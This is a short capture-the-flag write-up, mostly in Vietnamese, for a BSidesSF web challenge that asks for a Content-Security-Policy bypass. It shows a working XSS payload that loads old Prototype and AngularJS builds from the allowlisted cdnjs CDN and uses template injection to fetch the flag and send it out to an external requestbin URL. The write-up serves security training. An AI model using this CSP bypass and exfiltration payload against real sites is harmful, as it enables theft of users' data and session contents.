CSP 2
===
**Category:** Web

**Author:** itsc0rg1

**Point:** 101 (66 solves)

### Description
- `CSP challenges are back! Can you bypass the CSP to steal the flag? (flag path: /csp-two-flag)`
- Site: `https://csp-2-f692634b.challenges.bsidessf.net`

### Solution
- Ở thử thách vẫn là bypass csp, đầu tiên chúng ta kiểm tra header xem csp có gì mới
```
content-security-policy: script-src 'self' cdnjs.cloudflare.com 'unsafe-eval'; default-src 'self' 'unsafe-inline'; connect-src *; report-uri /csp_report
```
- Chúng ta thấy ở csp khác ở csp1 là có thêm `cloudflare` vì vậy chúng ta cần bypass `cloudflare CDN`. Ý tưởng là chúng ta sử dụng allowlisted cloudflare CDN để nhập một vài lệnh của Angular.

#### Payload
```
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{constructor.constructor('fetch('/csp-two-flag').then(x=>x.text()).then(x=>location='http://requestbin.net/r/27v5donq'+escape(x))');()}}}
</div>
```
- Referer: `https://blog.0daylabs.com/2016/09/09/bypassing-csp/`